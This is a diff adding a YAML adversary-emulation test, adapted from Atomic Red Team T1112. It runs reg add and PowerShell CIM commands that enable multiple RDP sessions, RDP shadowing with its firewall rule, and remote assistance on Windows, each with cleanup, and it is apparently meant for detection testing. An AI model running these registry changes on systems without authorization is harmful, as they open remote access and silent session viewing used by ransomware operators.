@@ -1,0 +1,71 @@
+# Adapted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guids: 35727d9e-7a7f-4d0c-a259-dc3906d6e8b9, 39f1f378-ba8a-42b3-96dc-2a6540cfc1e3, ac494fe5-81a4-4897-af42-e774cf005ecb, 86677d0e-0b5e-4a2b-b302-454175f9aa9e
+
+---
+api_version: 2.0
+uuid: 811da072-f2fb-401b-850b-7160c0ed1b57
+name: Enable RDP Multi-Session Features
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Enable various RDP and remote session capabilities including multiple RDP sessions per user, multiple user sessions,
+  RDP shadowing for remote viewing/control, and remote assistance. Mimic ransomware and Azorult malware use these
+  techniques to gain or maintain remote access to compromised systems.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: server_name
+    description: The remote server that we need to shadow and have to do the registry modification
+    type: string
+    default: "localhost"
+
+steps:
+  - name: allow_multiple_rdp_sessions
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /f
+
+  - name: enable_multiple_sessions
+    executor: cmd.exe
+    inline: |
+      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /v AllowMultipleTSSessions /f
+
+  - name: enable_rdp_shadowing
+    executor: powershell
+    inline: |
+      $s= New-CimSession -Computername {{.Args.server_name}} -SessionOption (New-CimSessionOption -Protocol Dcom)
+      Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s | Invoke-CimMethod -MethodName Enable
+      Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="shadow"; uValue=[uint32]2} -CimSession $s
+    cleanup:
+      executor: powershell
+      inline: |
+        Get-CimSession | Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"}
+
+  - name: allow_rdp_remote_assistance
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /f
